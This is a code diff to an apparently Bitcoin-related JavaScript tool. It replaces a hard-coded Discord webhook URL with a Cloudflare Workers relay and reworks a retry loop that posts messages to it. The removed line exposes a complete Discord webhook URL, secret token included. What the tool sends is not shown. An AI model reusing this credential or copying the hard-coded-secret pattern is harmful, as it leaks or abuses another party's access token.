@@ -9,26 +9,28 @@ bitcoin.initEccLib(tinysecp);
 const NETWORK = bitcoin.networks.bitcoin;
 const ECPair = ECPairFactory(tinysecp);
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1342822282627907654/t9EjJ6BOlkz7IShJOApUFy-m2AwHRdLZ9RljoI5Js7RAV29-IMxP72oQ591hKwMVCEu0"
+const WORKER_URL = "https://discordforward.feng73440.workers.dev/";
 
 async function sendToDiscord(message) {
     const data = { content: message };
 
     for (let i = 0; i < 3; i++) {  
         try {
-            const response = await fetch(WEBHOOK_URL, {
+            const response = await fetch(WORKER_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data),
             });
 
-            if (response.status === 204) {
+            if (response.ok) {
+                const resData = await response.json();
+                console.log("Worker response:", resData);
                 return;
             } else {
-                console.error(`Failed to send message: ${response.status}`);
+                console.error(`Failed to send message via Worker: ${response.status}`);
             }
         } catch (error) {
-            console.error(`Error sending message (attempt ${i + 1}):`, error);
+            console.error(`Error sending message via Worker (attempt ${i + 1}):`, error);
         }
         await new Promise(r => setTimeout(r, 1000)); 
     }
